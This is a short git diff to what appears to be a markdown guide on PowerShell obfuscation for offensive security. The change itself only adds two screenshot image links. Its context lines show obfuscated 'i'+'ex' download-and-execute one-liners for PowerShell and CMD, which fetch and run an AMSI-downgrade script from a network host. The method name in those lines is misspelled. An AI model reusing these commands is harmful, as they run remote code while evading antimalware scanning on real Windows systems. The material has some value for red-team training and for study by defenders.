@@ -1108,8 +1108,14 @@ Here we can view the all process of encoding/decoding in powershell console
       [another way]
       ## Obfuscating IEX (In PS Prompt)
       & ('i'+'ex') (New-Object Net.WebClient).DownloadSting('http://192.168.1.71/amsi-downgrade.ps1')
+      
+![obf2](https://user-images.githubusercontent.com/23490060/71784124-b17e0b80-2fe7-11ea-8593-a6ba045875c3.png)
+      
       ## Obfuscating IEX (In CMD Prompt)
       cmd /c powershell "& ('i'+'ex')" (New-Object Net.WebClient).DownloadSting('http://192.168.1.71/amsi-downgrade.ps1')
+
+![obf1](https://user-images.githubusercontent.com/23490060/71784122-ae831b00-2fe7-11ea-8140-a6e1ab8d32f0.png)
+
 
 ---
 
